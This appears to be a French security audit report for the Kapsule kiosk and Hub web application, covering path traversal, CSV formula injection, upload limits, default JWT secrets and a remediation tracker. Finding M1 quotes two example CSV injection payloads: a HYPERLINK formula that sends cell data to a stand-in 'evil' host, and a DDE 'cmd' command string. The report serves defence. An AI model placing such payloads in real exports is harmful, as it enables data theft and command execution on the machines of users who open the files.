# SECURITY — audit de sécurité Kapsule

Audit en lecture seule de la surface d'attaque (auth, autorisation, fichiers, injection,
réseau, secrets, frontend). Réalisé le **2026-06-14** sur la branche `main`.

> Ce document **consigne** les findings — aucun correctif n'a encore été appliqué.
> Le modèle de menace (qui peut exploiter) est explicité pour chaque point : il est
> déterminant ici car la **Borne** tourne en LAN offline pendant l'événement, tandis que
> le **Hub** est exposé sur Internet et mutualise les données de plusieurs clients.

## Légende des sévérités

| Niveau | Sens |
|---|---|
| 🔴 Élevé | Exploitable avec impact fort (RCE, écriture arbitraire, prise de contrôle, fuite multi-clients) |
| 🟠 Moyen | Exploitable sous conditions réalistes, impact notable (DoS, exécution chez le client, mauvaise config par défaut) |
| 🟡 Faible | Défense en profondeur, exploitation difficile ou impact limité |
| ✅ | Vérifié conforme — pas de finding |

---

## 🔴 Élevé

### H1 — Path traversal dans les routes de synchro du Hub

**Fichiers :** [sync.js:45](apps/hub/server/src/routes/sync.js#L45), [sync.js:51](apps/hub/server/src/routes/sync.js#L51), [sync.js:60](apps/hub/server/src/routes/sync.js#L60)

Dans `PUT /api/sync/events/:id/files/:videoId`, la fonction `destination` de multer
construit le chemin **avant** toute validation de l'événement :

```js
destination(req, file, cb) { cb(null, join(evDir(dataDir, req.params.id), 'videos')); }
filename(req, file, cb) { cb(null, `${req.params.videoId}${ext}`); }
```

`req.params.id` et `req.params.videoId` sont des segments d'URL contrôlés par l'appelant.
Express n'interdit que `/` dans un `:param`, mais `..` (ou `%2e%2e`) passe.
`path.join('/app/data/events', '..', '..', …)` **sort du répertoire de données** → écriture
de fichier arbitraire sur le disque du VPS. La validation `getEvent(db, req.params.id)`
existe ([sync.js:180](apps/hub/server/src/routes/sync.js#L180)) **mais s'exécute après**
que multer a déjà écrit le fichier.

**Modèle de menace :** exige un `X-Box-Token` valide → attaquant = borne compromise ou
token volé, pas un anonyme. Mais le push se fait sur Internet et le token transite à chaque
requête.

**Correctif proposé :** valider `req.params.id` / `videoId` contre un format UUID strict
(`/^[0-9a-f-]{36}$/`) dans un middleware placé **avant** multer (400 sinon). Idéalement,
résoudre l'événement et vérifier `box_id` avant toute écriture disque.

---

## 🟠 Moyen

### M1 — Injection de formule CSV (guest_name / question_text)

**Fichiers :** [videos.js:227](apps/borne/server/src/routes/videos.js#L227), [gallery.js:70](apps/hub/server/src/routes/gallery.js#L70)

L'échappement CSV double bien les guillemets (empêche la cassure de colonne) mais
**ne neutralise pas les préfixes de formule** (`=`, `+`, `-`, `@`). Un invité saisissant
comme prénom `=HYPERLINK("http://evil/"&A1)` ou `=cmd|'/c calc'!A1` obtient une cellule qui
**s'exécute à l'ouverture du CSV dans Excel/LibreOffice** par le client (l'organisateur).

**Modèle de menace :** `guest_name` est saisi par n'importe quel invité (champ libre du
kiosque). Vecteur réaliste puisque la finalité du CSV est d'être ouvert dans un tableur.

**Correctif proposé :** préfixer d'une apostrophe (ou d'un espace) toute valeur commençant
par `= + - @ \t \r`.

### M2 — Upload sync Hub sans limite de taille (DoS / saturation disque)

**Fichier :** [sync.js:42-66](apps/hub/server/src/routes/sync.js#L42-L66)

`uploadVideo` et `uploadDbFile` n'ont **aucun** `limits: { fileSize }`, contrairement à
l'upload Borne qui plafonne à 500 MB ([videos.js:40](apps/borne/server/src/routes/videos.js#L40)).
Nginx limite à 600M/requête mais `proxy_request_buffering off` écrit directement sur disque :
une borne malveillante peut multiplier les requêtes et **saturer le volume du VPS** (perte de
service pour tous les clients — données mutualisées).

**Correctif proposé :** poser `limits: { fileSize, files: 1 }` sur les deux multer côté Hub.

### M3 — Le secret JWT par défaut est `change-me`

**Fichiers :** [config.js (hub)](apps/hub/server/src/config.js#L5), [config.js (borne)](apps/borne/server/src/config.js#L6), [docker-compose.hub.yml:7](docker-compose.hub.yml#L7)

`JWT_SECRET` retombe sur `change-me` si non défini, et le compose injecte ce défaut
(`${JWT_SECRET:-change-me}`). Si le `.env` est oublié en prod, **n'importe qui peut forger
un JWT** `{ sub, role: 'admin' }` et prendre le contrôle total du Hub (toutes les vidéos de
tous les clients). Aucun garde-fou : le serveur démarre sans broncher avec le secret par défaut.

**Modèle de menace :** Hub exposé sur Internet + erreur d'exploitation courante.

**Correctif proposé :** refuser de démarrer en prod si `JWT_SECRET === 'change-me'` ou trop
court. Idem `ADMIN_PASSWORD` côté Borne.

---

## 🟡 Faible

### L1 — Algorithme JWT non épinglé

**Fichiers :** [auth.js:16 (hub)](apps/hub/server/src/middleware/auth.js#L16), [auth.js:31 (borne)](apps/borne/server/src/middleware/auth.js#L31)

`jwt.verify(token, secret)` sans `{ algorithms: ['HS256'] }`. Avec `jsonwebtoken` v9 le
risque `alg:none` est déjà rejeté par défaut → **non exploitable en l'état**, mais épingler
l'algorithme est une défense en profondeur recommandée.

### L2 — Login admin Borne : comparaison non constante + pas de rate-limit + défaut faible

**Fichier :** [auth.js:7 (borne)](apps/borne/server/src/middleware/auth.js#L7)

`password !== config.adminPassword` est une comparaison à temps variable (canal auxiliaire de
timing) et il n'y a **aucun rate-limit** sur `POST /api/admin/login` (le rate-limit n'existe
que sur le login Hub). Défaut `admin123`. **Atténué** par le fait que la Borne est en LAN
offline pendant l'événement (attaquant = quelqu'un sur le Wi-Fi de l'événement).

**Correctif proposé :** `crypto.timingSafeEqual`, refus de démarrer sur défaut, éventuellement
un petit rate-limit.

### L3 — L'error handler renvoie `err.message` au client

**Fichiers :** [index.js:41 (hub)](apps/hub/server/src/index.js#L41), [index.js:42 (borne)](apps/borne/server/src/index.js#L42)

En cas d'erreur 500, le message brut (chemin de fichier, erreur SQLite…) part dans la réponse
JSON. Divulgation d'information mineure facilitant la reconnaissance.

**Correctif proposé :** logger le détail côté serveur, renvoyer un message générique pour les 500.

### L4 — Token JWT en `?token=` dans les logs Nginx

Déjà identifié dans [PROJET.md §13](PROJET.md) (risque accepté). Les URLs `<video src>` /
download / CSV passent le JWT en query string → il peut finir dans les logs d'accès du VPS.
Mitigation possible : token média court (5 min) ou `log_format` sans query string.

---

## ✅ Points vérifiés conformes (pas de finding)

- **Injection SQL** : requêtes préparées `better-sqlite3` partout. Les `UPDATE SET ${...}`
  dynamiques ([registry.js:122](apps/hub/server/src/registry.js#L122), questions) utilisent une
  **allowlist de colonnes** codée en dur, valeurs liées. Sûr.
- **Command injection ffmpeg** : `spawn(cmd, args)` avec tableau d'arguments, jamais
  `shell:true` ; chemins = UUID serveur. Sûr.
- **Path traversal upload Borne** : nom de fichier = `${uuidv4()}${extname(originalname)}` —
  seule l'extension de l'`originalname` attaquant est reprise, collée à un UUID serveur.
  Pas d'évasion.
- **Path traversal galerie Hub** : `req.params.eventId` est gardé par `requireOwner` →
  `getEvent` (404 si inexistant) **avant** l'accès disque. `filename` vient de la BD. Sûr.
- **Cloisonnement multi-clients (RGPD)** : `requireOwner` sur **toutes** les routes événement
  (403 si `owner_id ≠ user`, sauf admin), testé avec 2 comptes. `registry.sqlite` ne contient
  aucune donnée invité.
- **XSS** : aucun `dangerouslySetInnerHTML` / `innerHTML` / `eval` dans les deux frontends ;
  React échappe par défaut.
- **IDOR sessions invité** : `GET /sessions/:id/answers` et `/videos/:qid/file` publics avec
  l'UUIDv4 de session comme capability token (122 bits, non devinable) — choix de conception
  assumé, Borne en LAN. Acceptable.
- **TLS sortant Borne→Hub** : `fetch` natif valide les certificats par défaut.
- **Rate-limit login Hub** : 10/15 min/IP présent ([auth.js:8](apps/hub/server/src/routes/auth.js#L8)).
- **Mots de passe** : argon2id côté Hub. Token de borne stocké en `sha256` uniquement, affiché
  une seule fois.

---

## Priorisation recommandée

1. **H1** — valider les params UUID avant multer (path traversal sync Hub).
2. **M3** — refuser le démarrage sur `JWT_SECRET=change-me` (une ligne, élimine la pire erreur d'exploitation).
3. **M2** (limites multer Hub) et **M1** (préfixe anti-formule CSV) — quelques lignes chacun.
4. **L1–L4** — défense en profondeur, au fil de l'eau.

---

## Suivi

| ID | Sévérité | Statut | Notes |
|---|---|---|---|
| H1 | 🔴 Élevé | ✅ Corrigé | S1.1 — `validateUuidParams` avant multer (`middleware/validateParams.js`) |
| M1 | 🟠 Moyen | ✅ Corrigé | S4.1 — préfixe apostrophe sur `= + - @ \t \r` dans `videos.js` + `gallery.js` (`2d90264`) |
| M2 | 🟠 Moyen | ✅ Corrigé | S3.1 — `limits: { fileSize, files: 1 }` sur les deux multer + MulterError → 413 (`3c5047a`) |
| M3 | 🟠 Moyen | ⏸ Reporté | À traiter en fin de projet (durcissement déploiement, non prioritaire) |
| L1 | 🟡 Faible | ✅ Corrigé | S5.1 — `algorithms: ['HS256']` dans tous les `jwt.verify` + test alg:none (`dce0dda`) |
| L2 | 🟡 Faible | ✅ Corrigé | S5.2 — `timingSafeEqual` pour le login admin Borne (`a9473bc`) |
| L3 | 🟡 Faible | ✅ Corrigé | S5.3 — 5xx → message générique + log serveur (hub + borne) (`7af4d2e`) |
| L4 | 🟡 Faible | Accepté | Déjà tracé PROJET.md §13 |
